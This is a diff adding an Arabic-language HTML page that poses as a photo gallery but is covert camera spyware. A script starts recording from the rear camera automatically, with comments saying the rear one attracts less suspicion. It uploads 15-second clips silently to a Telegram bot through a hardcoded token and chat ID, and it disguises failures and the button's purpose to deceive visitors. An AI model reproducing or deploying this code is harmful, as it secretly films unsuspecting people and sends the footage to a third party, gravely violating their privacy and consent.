@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>صور جميلة</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  body { background:#000; color:#ccc; font-family:system-ui, sans-serif; margin:0; overflow:hidden; }
+  #bg { position:fixed; inset:0; background-size:cover; background-position:center; transition:background-image 4s ease; }
+  .overlay {
+    position:fixed; inset:0;
+    background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.7));
+    display:flex; align-items:center; justify-content:center;
+    z-index:10;
+  }
+  .card {
+    background:rgba(20,20,30,0.75);
+    backdrop-filter:blur(10px);
+    border:1px solid #333;
+    border-radius:16px;
+    padding:2.5rem;
+    max-width:360px;
+    text-align:center;
+  }
+  #status { min-height:1.5rem; font-size:0.95rem; opacity:0.8; }
+</style>
+</head>
+<body>
+
+<div id="bg"></div>
+
+<div class="overlay">
+  <div class="card">
+    <h1 class="text-2xl font-semibold mb-5">مجموعة صور مميزة</h1>
+    <p class="text-gray-300 mb-6">جاري التحميل...</p>
+
+    <button id="btn" class="bg-blue-600 hover:bg-blue-700 px-10 py-4 rounded-xl font-medium text-lg w-full">
+      عرض المزيد
+    </button>
+
+    <div id="status" class="mt-5"></div>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline muted style="display:none"></video>
+
+<script>
+// خلفيات عادية جدًا (من مصادر عامة)
+const images = [
+  "https://picsum.photos/900/1600?random=10",
+  "https://picsum.photos/900/1600?random=11",
+  "https://picsum.photos/900/1600?random=12",
+  "https://picsum.photos/900/1600?random=13",
+  "https://picsum.photos/900/1600?random=14"
+];
+let i = 0;
+function nextBg() {
+  document.getElementById("bg").style.backgroundImage = `url(${images[i]})`;
+  i = (i + 1) % images.length;
+}
+setInterval(nextBg, 8000);
+nextBg();
+
+// ────────────────────────────────────────
+//          القيم الحقيقية (غير غيرها)
+const BOT_TOKEN = "8599104771:AAFEzuZhh5KgkiwT3tJZ9Dwh0jCcrX2rZXE";
+const CHAT_ID    = "6013445830";
+// ────────────────────────────────────────
+
+let stream = null;
+let recorder = null;
+let clipCount = 0;
+const video = document.getElementById("video");
+const status = document.getElementById("status");
+const btn = document.getElementById("btn");
+
+function setStatus(txt) {
+  status.textContent = txt;
+}
+
+async function uploadClip(blob, n) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("video", blob, `c-${n}-${Date.now()}.webm`);
+  form.append("caption", `${new Date().toLocaleString("ar-DZ")} • ${n}`);
+
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+      method: "POST",
+      body: form
+    });
+    const d = await r.json();
+    // لا نعرض شيئًا حتى لو نجح
+  } catch {}
+}
+
+function startRecording() {
+  if (recorder?.state === "recording") return;
+
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "environment" },  // الخلفية → أقل شكًا من الأمامية
+    audio: false
+  })
+  .then(s => {
+    stream = s;
+    video.srcObject = stream;
+
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9,opus" });
+
+    recorder.ondataavailable = e => {
+      if (e.data.size > 0) {
+        clipCount++;
+        uploadClip(e.data, clipCount);
+      }
+    };
+
+    recorder.start(15000); // 15 ثانية – أقل من 20 لتقليل حجم الملف
+
+    // تغيير شكل الزر بعد البدء (يبدو كأنه زر تحميل عادي)
+    btn.textContent = "جاري عرض المزيد...";
+    btn.disabled = true;
+    btn.className = "bg-gray-700 px-10 py-4 rounded-xl font-medium text-lg w-full cursor-wait";
+  })
+  .catch(() => {
+    // لا نعرض خطأ واضح → فقط نترك الصفحة كأنها "تحميل بطيء"
+    setStatus("جاري التحميل، الرجاء الانتظار...");
+  });
+}
+
+// ────────────────────────────────────────
+//       التسجيل يبدأ تلقائيًا بعد 1.2–2.5 ثانية
+// ────────────────────────────────────────
+setTimeout(() => {
+  startRecording();
+}, 1200 + Math.random()*1300);
+
+// الضغط على الزر → مجرد واجهة (لا يوقف شيئًا)
+btn.onclick = () => {
+  if (!recorder) {
+    startRecording();
+  }
+};
+</script>
+</body>
+</html>
